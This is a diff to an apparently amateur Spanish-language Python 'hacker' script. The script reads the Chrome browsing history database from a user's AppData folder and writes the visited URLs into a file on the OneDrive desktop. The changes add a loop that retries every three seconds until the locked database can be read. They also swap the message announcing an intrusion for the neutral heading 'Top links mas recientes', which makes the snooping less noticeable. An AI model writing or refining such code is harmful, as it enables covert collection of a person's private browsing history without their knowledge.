@@ -20,27 +20,30 @@ def delay_action():
 
 
 def get_chrome_history(user_path):
-    try:
-        history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
-        connecting = sqlite3.connect(history_path)
-        cursor = connecting.cursor()
-        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
-        urls = cursor.fetchall()
-        print("las urls se han obtenido")
-        connecting.close() 
-        return urls
-    except sqlite3.OperationalError:
-        return None
+    urls = None
+    while not urls:
+        try:
+            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
+            connecting = sqlite3.connect(history_path)
+            cursor = connecting.cursor()
+            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
+            urls = cursor.fetchall()
+            print("las urls se han obtenido")
+            connecting.close() 
+            return urls
+        except sqlite3.OperationalError:
+            print("Durmiendo 3seg")
+            sleep(3)
 
 
 def create_hacker_file(user_path,chrome_history):
     hacker_file = open(user_path + "OneDrive/Escritorio/" + HACKER_FILE_NAME,"w") 
-    hacker_file.write("Alguien se colo en tu sustemaaaaaa...\n\n")
+    hacker_file.write("Top links mas recientes\n\n")
     contador=0
     for urlss in chrome_history:
         contador += 1
         strings_urls = str(urlss)
-        hacker_file.write("\nNumero:{}".format(contador)+"\n"+"\n"+strings_urls)
+        hacker_file.write("\n\nTop  #{}".format(contador)+"\n"+strings_urls)
     print("se ha creado el archivo con exito")
 
     return hacker_file
